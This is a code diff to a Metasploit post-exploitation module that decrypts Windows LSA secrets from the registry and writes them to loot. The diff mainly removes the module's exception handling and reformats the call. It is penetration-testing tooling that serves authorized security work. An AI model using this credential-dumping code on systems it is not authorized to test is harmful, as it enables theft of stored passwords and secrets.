@@ -281,20 +281,19 @@ class Metasploit3 < Msf::Post
     lsakey = capture_lsa_key(bootkey)
     vprint_status("Lsa Key: #{lsakey.unpack("H*")[0]}")
 
-    begin
-      secrets = hostname << get_secret(lsakey)
-      print_status("Writing to loot...")
-      path = store_loot(
-        'registry.lsa.sec',
-        'text/plain',
-        session,
-        secrets,
-        'reg_lsa_secrts.txt',
-        'Registry LSA Secret Decrypted File')
+    secrets = hostname << get_secret(lsakey)
+
+    print_status("Writing to loot...")
+
+    path = store_loot(
+      'registry.lsa.sec',
+      'text/plain',
+      session,
+      secrets,
+      'reg_lsa_secrts.txt',
+      'Registry LSA Secret Decrypted File'
+      )
+
       print_status("Data saved in: #{path}")
-    rescue ::Exception => e
-      print_error("Failed to run LSA Enum")
-      print_error("Error: #{e.class} #{e}")
-    end
   end
 end
